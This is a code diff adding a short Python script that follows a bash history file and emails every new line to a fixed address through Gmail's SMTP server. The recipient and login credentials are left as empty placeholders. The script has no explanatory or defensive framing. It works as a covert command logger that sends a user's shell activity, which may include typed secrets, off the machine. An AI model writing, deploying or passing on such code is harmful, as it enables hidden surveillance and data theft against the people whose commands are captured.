@@ -1,0 +1,34 @@
+import sys
+import smtplib
+import time
+import subprocess
+import select
+line = ""
+bashHistory = ""
+f = subprocess.Popen(['tail','-F',bashHistory],\
+	stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+p = select.poll()
+p.register(f.stdout)
+while True:
+	if p.poll(1):
+		line = f.stdout.readline()
+
+		msg = line
+		print('sorted input')
+		fromaddr ="" #your email
+		toaddrs = "" #youremail
+
+
+
+#creds
+		username ="" #username
+		password ="" #password
+
+
+		server = smtplib.SMTP('smtp.gmail.com:587')
+		server.starttls()
+		server.login(username,password)
+		server.sendmail(fromaddr,toaddrs,msg)
+		server.quit()
+		print("email sent")
+	time.sleep(1)
